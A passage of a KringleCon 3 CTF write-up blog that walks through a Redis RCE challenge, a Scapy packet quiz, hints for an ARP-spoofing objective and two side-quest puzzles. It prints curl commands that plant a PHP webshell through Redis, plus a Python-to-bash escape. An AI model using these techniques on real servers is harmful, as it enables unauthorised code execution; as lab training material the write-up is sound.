    <img data-src="/images/kringlecon3/cranpi/pi06_03.webp" alt="redis info" data-caption="redis info" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      redis info
      
        
        
      
    </figcaption>
  
</figure>
<p>As explained by <strong>Holly</strong>,  we may exploit an <em>RCE</em> vulnerability in <em>Redis</em>. We can follow <a href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#redis-rce">this procedure</a> to write a <em>PHP</em> file in the web files and execute system calls. Spaces in commands must be replaced by commas. </p>
<p>In our case, the web files are located in <code>/var/www/html</code>, so to change <em>Redis</em> working directory, we have to execute:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_04.webp" alt="curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html" data-caption="curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl http://localhost/maintenance.php?cmd=config,set,dir,/var/www/html
      
        
        
      
    </figcaption>
  
</figure>
<p>Then we set the file in which we want to write as the current database (here we create a new file <code>rce.php</code>):</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_05.webp" alt="curl http://localhost/maintenance.php?cmd=config,set,dbfilename,rce.php" data-caption="curl http://localhost/maintenance.php?cmd=config,set,dbfilename,rce.php" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl http://localhost/maintenance.php?cmd=config,set,dbfilename,rce.php
      
        
        
      
    </figcaption>
  
</figure>
<p>We create a dummy value <code>test</code> containing what we want to write into the database file. As the goal is to read <code>index.php</code>, we can use the <em>PHP</em> system call to display it. Do not forget to <em>URL</em>-encode special characters:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_06.webp" alt="curl http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%20echo%28system%28%22cat%20index.php%22%29%29%3b%3F%3E" data-caption="curl http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%20echo%28system%28%22cat%20index.php%22%29%29%3b%3F%3E" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl http://localhost/maintenance.php?cmd=set,test,%3C%3Fphp%20echo%28system%28%22cat%20index.php%22%29%29%3b%3F%3E
      
        
        
      
    </figcaption>
  
</figure>
<p>Finally, we dump the <em>Redis</em> buffer containing our <code>test</code> value into our <code>rce.php</code> file with the <code>save</code> command:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_07.webp" alt="curl http://localhost/maintenance.php?cmd=save" data-caption="curl http://localhost/maintenance.php?cmd=save" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl http://localhost/maintenance.php?cmd=save
      
        
        
      
    </figcaption>
  
</figure>
<p>Now we can <code>curl</code> our new <em>PHP</em> file to see the content of the <code>index.php</code> file and validate the challenge:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi06_08.webp" alt="curl http://localhost/rce.php --output -" data-caption="curl http://localhost/rce.php --output -" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      curl http://localhost/rce.php --output -
      
        
        
      
    </figcaption>
  
</figure>
<p><strong>Holly</strong> gives us some hints to complete <a href="#8---broken-tag-generator">Objective 8</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Holly Evergreen:</strong><br />
See? I knew you could to it!</p>
<p>I wonder, could we figure out the problem with the <em>Tag Generator</em> if we can get the source code? Can you figure out the path to the script? I&rsquo;ve discovered that enumerating all endpoints is a really good idea to understand an application&rsquo;s functionality. Sometimes I find the <code>Content-Type</code> header hinders the browser more than it helps. If you find a way to execute code blindly, maybe you can redirect to a file then download that file?</p>
</div>
<div class="notices success" data-title="Objective 8 hints">
  <ul>
<li>Source Code Retrieval - We might be able to find the problem if we can get source code!</li>
<li>Error Page Message Disclosure - Can you figure out the path to the script? It&rsquo;s probably on error pages!</li>
<li>Download File Mechanism - Once you know the path to the file, we need a way to download it!</li>
<li>Endpoint Exploration - Is there an endpoint that will print arbitrary files?</li>
<li>Content-Type Gotcha - If you&rsquo;re having trouble seeing the code, watch out for the Content-Type! Your browser might be trying to help (badly)!</li>
<li>Source Code Analysis - I&rsquo;m sure there&rsquo;s a vulnerability in the source somewhere&hellip; surely Jack wouldn&rsquo;t leave their mark?</li>
<li>Redirect to Download - If you find a way to execute code blindly, I bet you can redirect to a file then download that file!</li>
<li>Patience and Timing - Remember, the processing happens in the background so you might need to wait a bit after exploiting but before grabbing the output!</li>
</ul>

</div>
<h3 id="7---scapy-prepper">7 - Scapy Prepper</h3>
<hr />
<div class="box">[ELF] <strong>Alabaster Snowball</strong> [LOCATION] <em>Roof</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi07_01.webp" alt="CranPi 7 location" data-caption="CranPi 7 location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      CranPi 7 location
      
        
        
      
    </figcaption>
  
</figure>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Alabaster Snowball:</strong><br />
Welcome to the roof! <strong>Alabaster Snowball</strong> here.</p>
<p>I&rsquo;m watching some elves play <em>NetWars</em>! Feel free to try out our <em>Scapy Present Packet Prepper</em>! If you get stuck, you can <code>help()</code> to see how to get tasks and hints.</p>
</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/cranpi/pi07_02.webp" alt="terminal instructions" data-caption="terminal instructions" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      terminal instructions
      
        
        
      
    </figcaption>
  
</figure>
<p>This is a challenge around <a href="https://scapy.net">Scapy</a>. <em>Scapy</em> is a <em>Python</em> program and library used to manipulate, sniff and dissect network packets. We will go through a few questions that will lead us through the basic usage of <em>Scapy</em>:</p>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q1: Submit the class object of the scapy module that sends packets at layer 3 of the OSI model.</div>
<div class="box">&gt;&gt;&gt; task.submit(send)<br />
Correct! The &ldquo;send&rdquo; scapy class will send a crafted scapy packet out of a network interface.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q2: Submit the class object of the scapy module that sniffs network packets and returns those packets in a list.</div>
<div class="box">&gt;&gt;&gt; task.submit(sniff)<br />
Correct! the &ldquo;sniff&rdquo; scapy class will sniff network traffic and return these packets in a list.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr"><p>Q3: Submit the NUMBER only from the choices below that would successfully send a TCP packet and then return the first sniffed response packet to be stored in a variable named &ldquo;pkt&rdquo;:</p>
<ol>
<li>pkt = sr1(IP(dst=&ldquo;127.0.0.1&rdquo;)/TCP(dport=20))</li>
<li>pkt = sniff(IP(dst=&ldquo;127.0.0.1&rdquo;)/TCP(dport=20))</li>
<li>pkt = sendp(IP(dst=&ldquo;127.0.0.1&rdquo;)/TCP(dport=20))</li>
</ol>
</div>
<div class="box">&gt;&gt;&gt; task.submit(1)<br />
Correct! sr1 will send a packet, then immediately sniff for a response packet.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q4: Submit the class object of the scapy module that can read pcap or pcapng files and return a list of packets.</div>
<div class="box">&gt;&gt;&gt; task.submit(rdpcap)<br />
Correct! the &ldquo;rdpcap&rdquo; scapy class can read pcap files.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr"><p>Q5: The variable UDP_PACKETS contains a list of UDP packets. Submit the NUMBER only from the choices below that correctly prints a summary of UDP_PACKETS:</p>
<ol>
<li>UDP_PACKETS.print()</li>
<li>UDP_PACKETS.show()</li>
<li>UDP_PACKETS.list()</li>
</ol>
</div>
<div class="box">&gt;&gt;&gt; task.submit(2)<br />
Correct! .show() can be used on lists of packets AND on an individual packet.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q6: Submit only the first packet found in UDP_PACKETS.</div>
<div class="box">&gt;&gt;&gt; task.submit(UDP_PACKETS[0])<br />
Correct! Scapy packet lists work just like regular python lists so packets can be accessed by their position in the list starting at offset 0.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q7: Submit only the entire TCP layer of the second packet in TCP_PACKETS.</div>
<div class="box">&gt;&gt;&gt; task.submit(TCP_PACKETS[1][TCP])<br />
Correct! Most of the major fields like Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, DNSRR, Raw, etc&hellip; can be accessed this way. Ex - pkt[IP][TCP]</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q8: Change the source IP address of the first packet found in UDP_PACKETS to 127.0.0.1 and then submit this modified packet</div>
<div class="box">&gt;&gt;&gt; UDP_PACKETS[0][IP].src = &lsquo;127.0.0.1&rsquo;<br />
&gt;&gt;&gt; task.submit(UDP_PACKETS[0])<br />
Correct! You can change ALL scapy packet attributes using this method.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q9: Submit the password &ldquo;task.submit(&lsquo;elf_password&rsquo;)&rdquo; of the user alabaster as found in the packet list TCP_PACKETS.</div>
<p>We can list all TCP info in all the packets with:</p>
<div class="box">&gt;&gt;&gt; [pkt[TCP] for pkt in TCP_PACKETS]</div>
<p>We see some packets with <code>Raw</code> data. The 7th packet contains a password:</p>
<div class="box"><p>&gt;&gt;&gt; TCP_PACKETS[6]<br />
&lt;Ether  dst=00:15:f2:40:76:ef src=00:16:ce:6e:8b:24 type=IPv4 |&lt;IP  version=4 ihl=5 tos=0x0 len=51 id=42982 flags=DF frag=0 ttl=128 proto=tcp chksum=0xd05a src=192.168.0.114 dst=192.168.0.193 |&lt;TCP  sport=1137 dport=ftp seq=3753095950 ack=3334930821 dataofs=5 reserved=0 flags=PA window=17357 chksum=0xe96b urgptr=0 |&lt;Raw  load=&lsquo;PASS echo\r\n&rsquo; |&gt;&gt;&gt;&gt;</p>
<p>&gt;&gt;&gt; task.submit(&lsquo;echo&rsquo;)<br />
Correct! Here is some really nice list comprehension that will grab all the raw payloads from tcp packets:<br />
[pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]</p>
</div>
<p>By running the recommended command, we see that this is an <em>FTP</em> flow:</p>
<div class="box">&gt;&gt;&gt; [pkt[Raw].load for pkt in TCP_PACKETS if Raw in pkt]<br />
[b'220 North Pole FTP Server\r\n', b&rsquo;USER alabaster\r', b'331 Password required for alabaster.\r', b&rsquo;PASS <strong>echo</strong>\r\n', b'230 User alabaster logged in.\r']</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q10: The ICMP_PACKETS variable contains a packet list of several icmp echo-request and icmp echo-reply packets. Submit only the ICMP chksum value from the second packet in the ICMP_PACKETS list.</div>
<div class="box"><p>&gt;&gt;&gt; hex(ICMP_PACKETS[1][ICMP].chksum)<br />
&lsquo;0x4c44&rsquo;</p>
<p>&gt;&gt;&gt; task.submit(0x4c44)<br />
Correct! You can access the ICMP chksum value from the second packet using ICMP_PACKETS[1][ICMP].chksum .</p>
</div>
<div class="alert alert-warning" role="alert" data-dir="ltr"><p>Q11: Submit the number of the choice below that would correctly create a ICMP echo request packet with a destination IP of 127.0.0.1 stored in the variable named &ldquo;pkt&rdquo;</p>
<ol>
<li>pkt = Ether(src=&lsquo;127.0.0.1&rsquo;)/ICMP(type=&ldquo;echo-request&rdquo;)</li>
<li>pkt = IP(src=&lsquo;127.0.0.1&rsquo;)/ICMP(type=&ldquo;echo-reply&rdquo;)</li>
<li>pkt = IP(dst=&lsquo;127.0.0.1&rsquo;)/ICMP(type=&ldquo;echo-request&rdquo;)</li>
</ol>
</div>
<div class="box">&gt;&gt;&gt; task.submit(3)<br />
Correct! Once you assign the packet to a variable named &ldquo;pkt&rdquo; you can then use that variable to send or manipulate your created packet.</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q12: Create and then submit a UDP packet with a dport of 5000 and a dst IP of 127.127.127.127. (all other packet attributes can be unspecified)</div>
<div class="box">&gt;&gt;&gt; pkt = IP(dst=&ldquo;127.127.127.127&rdquo;)/UDP(dport=5000)<br />
&gt;&gt;&gt; task.submit(pkt)<br />
Correct! Your UDP packet creation should look something like this:<br />
pkt = IP(dst=&ldquo;127.127.127.127&rdquo;)/UDP(dport=5000)<br />
task.submit(pkt)</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q13: Create and then submit a UDP packet with a dport of 53, a dst IP of 127.2.3.4, and is a DNS query with a qname of &ldquo;elveslove.santa&rdquo;. (all other packet attributes can be unspecified)</div>
<div class="box">&gt;&gt;&gt; pkt = IP(dst=&ldquo;127.2.3.4&rdquo;)/UDP(dport=53)/DNS(qd=DNSQR(qname=&ldquo;elveslove.santa&rdquo;))<br />
&gt;&gt;&gt; task.submit(pkt)<br />
Correct! Your UDP packet creation should look something like this:<br />
pkt = IP(dst=&ldquo;127.2.3.4&rdquo;)/UDP(dport=53)/DNS(rd=1,qd=DNSQR(qname=&ldquo;elveslove.santa&rdquo;))<br />
task.submit(pkt)</div>
<div class="alert alert-warning" role="alert" data-dir="ltr">Q14: The variable ARP_PACKETS contains an ARP request and response packets. The ARP response (the second packet) has 3 incorrect fields in the ARP layer. Correct the second packet in ARP_PACKETS to be a proper ARP response and then task.submit(ARP_PACKETS) for inspection.</div>
<p>Let&rsquo;s look at the second packet:</p>
<div class="box">&gt;&gt;&gt; ARP_PACKETS[1]<br />
&lt;Ether  dst=00:16:ce:6e:8b:24 src=00:13:46:0b:22:ba type=ARP |&lt;ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=None hwsrc=ff:ff:ff:ff:ff:ff psrc=192.168.0.1 hwdst=ff:ff:ff:ff:ff:ff pdst=192.168.0.114 |&lt;Padding  load='\xc0\xa8\x00r' |&gt;&gt;&gt;</div>
<p>The errors are:</p>
<ul>
<li><code>hwsrc</code> and <code>hwdst</code> are set to <code>ff:ff:ff:ff:ff:ff</code> and should be set to the <em>Ethernet</em> <code>src</code> and <code>dst</code> value,</li>
<li>the <code>op</code> value is set to <code>None</code> and should instead be set to &lsquo;reply&rsquo; that has a value of <code>2</code>.</li>
</ul>
<div class="box">&gt;&gt;&gt; ARP_PACKETS[1][ARP].hwsrc=&ldquo;00:13:46:0b:22:ba&rdquo;<br />
&gt;&gt;&gt; ARP_PACKETS[1][ARP].hwdst=&ldquo;00:16:ce:6e:8b:24&rdquo;<br />
&gt;&gt;&gt; ARP_PACKETS[1][ARP].op=2<br />
&gt;&gt;&gt; task.submit(ARP_PACKETS)<br />
Great, you prepared all the present packets!<br />
Congratulations, all pretty present packets properly prepared for processing!</div>
<p>We can easily escape the <em>Python</em> interpreter by running:</p>
<div class="box">&gt;&gt;&gt; import os<br />
&gt;&gt;&gt; os.system('/bin/bash')</div>
<p>We talk again to <strong>Alabaster</strong> so that he gives us some hints to complete <a href="#9---arp-shenanigans">Objective 9</a>:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Alabaster Snowball:</strong><br />
Great job! Thanks! Those skills might be useful to you later on!</p>
<p>I&rsquo;ve been trying those skills out myself on this other terminal. I&rsquo;m pretty sure I can use <code>tcpdump</code> to sniff some packets. Then I&rsquo;m going to try a machine-in-the-middle attack.</p>
<p>Next, I&rsquo;ll spoof a <em>DNS</em> response to point the host to my terminal. Then I want to respond to its <em>HTTP</em> request with something I&rsquo;ll cook up. I&rsquo;m almost there, but I can&rsquo;t quite get it. I could use some help!</p>
<p>For privacy reasons though, I can&rsquo;t let you access this other terminal. I do plan to ask <strong>Santa</strong> for a hand with it next time he&rsquo;s nearby, though.</p>
</div>
<div class="notices success" data-title="Objective 9 hints">
  <ul>
<li>Sniffy - Jack Frost must have gotten malware on our host at 10.6.6.35 because we can no longer access it. Try sniffing the eth0 interface using tcpdump -nni eth0 to see if you can view any traffic from that host.</li>
<li>Spoofy - The host is performing an ARP request. Perhaps we could do a spoof to perform a machine-in-the-middle attack. I think we have some sample scapy traffic scripts that could help you in /home/guest/scripts.</li>
<li>Resolvy - Hmmm, looks like the host does a DNS request after you successfully do an ARP spoof. Let&rsquo;s return a DNS response resolving the request to our IP.</li>
<li>Embedy - The malware on the host does an HTTP request for a .deb package. Maybe we can get command line access by sending it a <a href="http://www.wannescolman.be/?p=98">command in a customized .deb file</a>.</li>
</ul>

</div>
<h2 id="side-quests">Side Quests</h2>
<h3 id="the-336kbps-modem">The 33.6kbps Modem</h3>
<p><strong>Fitzy</strong> is waiting for us in the kitchen and has some issues with an old modem:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Fitzy Shortstack:</strong><br />
&ldquo;Put it in the cloud&rdquo;, they said… &ldquo;It&rsquo;ll be great&rdquo;, they said…</p>
<p>All the lights on the <em>Christmas</em> trees throughout the castle are controlled through a remote server. We can shuffle the colors of the lights by connecting via dial-up, but our only modem is broken!</p>
<p>Fortunately, I speak dial-up. However, I can&rsquo;t quite remember the <a href="https://upload.wikimedia.org/wikipedia/commons/3/33/Dial_up_modem_noises.ogg">handshake sequence</a>. Maybe you can help me out? The phone number is <strong>756–8347</strong>; you can use this blue phone.</p>
</div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/objectives/obj5_02.webp" alt="Fitzy Shortstack location" data-caption="Fitzy Shortstack location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Fitzy Shortstack location
      
        
        
      
    </figcaption>
  
</figure>
<p>When we access the modem, we have to take the handset, compose the phone number we were given and then manually do the handshake based on the &ldquo;well-known&rdquo; dial-up modem sounds that old people, like me, still dream of :) You can see the solution below:</p>
<p><video controls src="/images/kringlecon3/objectives/obj5_04.mp4" preload="auto" width="80%" type="video/mp4" style="margin: auto; display: block"></video><br />
Once completed, <strong>Fitzy</strong> says:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><strong>Fitzy Shortstack:</strong><br />
탢ݵרOُ񆨶$Ԩ؉楌Բ ahem! We did it! Thank you!!<br />
Anytime you feel like changing the color scheme up, just pick up the phone! You know, Santa really seems to trust <strong>Shinny Upatree</strong>…</div>
<p>If we do it a few more times, we can change the color scheme of the <em>Christmas</em> tree behind.</p>
<h3 id="the-sort-o-matic">The Sort-O-Matic</h3>
<hr />
<div class="box">[ELF] <strong>Minty Candycane</strong> [LOCATION] <em>Workshop</em></div>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game03_01.webp" alt="Sort-O-Matic location" data-caption="Sort-O-Matic location" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Sort-O-Matic location
      
        
        
      
    </figcaption>
  
</figure>
<p>We find <strong>Minty</strong> in the <em>Workshop</em>, he is struggling with a present sorting machine:</p>
<div class="alert alert-info" role="alert" data-dir="ltr"><p><strong>Minty Candycane:</strong><br />
Hey there, <em>KringleCon</em> attendee! I&rsquo;m <strong>Minty Candycane</strong>!</p>
<p>I&rsquo;m working on fixing the <em>Present Sort-O-Matic</em>. The <em>Sort-O-Matic</em> uses <em>JavaScript</em> regular expressions to sort presents apart from misfit toys, but it&rsquo;s not working right. With some tools, regexes need <code>/</code> at the beginning and the ends, but they aren&rsquo;t used here.</p>
<p>You can find a regular expression cheat sheet <a href="https://www.debuggex.com/cheatsheet/regex/javascript">here</a> if you need it. You can use <a href="https://regex101.com/">this</a> regex interpreter to test your regex against the required <em>Sort-O-Matic</em> patterns.</p>
<p>Do you think you can help me fix it?</p>
</div>
<div class="notices success" data-title="Present Sort-O-Matic hints">
  <ul>
<li>JavaScript Regex Cheat Sheet - Handy quick reference for JS regular expression construction: <a href="https://www.debuggex.com/cheatsheet/regex/javascript">https://www.debuggex.com/cheatsheet/regex/javascript</a>.</li>
<li>Regex Practice - Here&rsquo;s a place to try out your JS Regex expressions: <a href="https://regex101.com/">https://regex101.com/</a>.</li>
</ul>

</div>
<p>This challenge can as well be done on <a href="https://present-sorter.kringlecastle.com/">https://present-sorter.kringlecastle.com/</a>.</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game03_02.webp" alt="Present Sort-O-Matic" data-caption="Present Sort-O-Matic" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
    <figcaption style="text-align: center;">
      
      Present Sort-O-Matic
      
        
        
      
    </figcaption>
  
</figure>
<p>We basically have to find the 8 regexes below in order to repair the <code>Present Sort-O-Matic</code>:</p>
<figure >
  
  
  
    <img data-src="/images/kringlecon3/games/game03_03.webp" alt="regexes" data-caption="regexes" src="data:image/svg+xml,%0A%3Csvg xmlns='http://www.w3.org/2000/svg' width='80%25' height='' viewBox='0 0 24 24'%3E%3Cpath fill='none' d='M0 0h24v24H0V0z'/%3E%3Cpath fill='%23aaa' d='M19 3H5c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-1 16H6c-.55 0-1-.45-1-1V6c0-.55.45-1 1-1h12c.55 0 1 .45 1 1v12c0 .55-.45 1-1 1zm-4.44-6.19l-2.35 3.02-1.56-1.88c-.2-.25-.58-.24-.78.01l-1.74 2.23c-.26.33-.02.81.39.81h8.98c.41 0 .65-.47.4-.8l-2.55-3.39c-.19-.26-.59-.26-.79 0z'/%3E%3C/svg%3E" class="lazyload" style="width:80%;height:;"/>
  

  
  
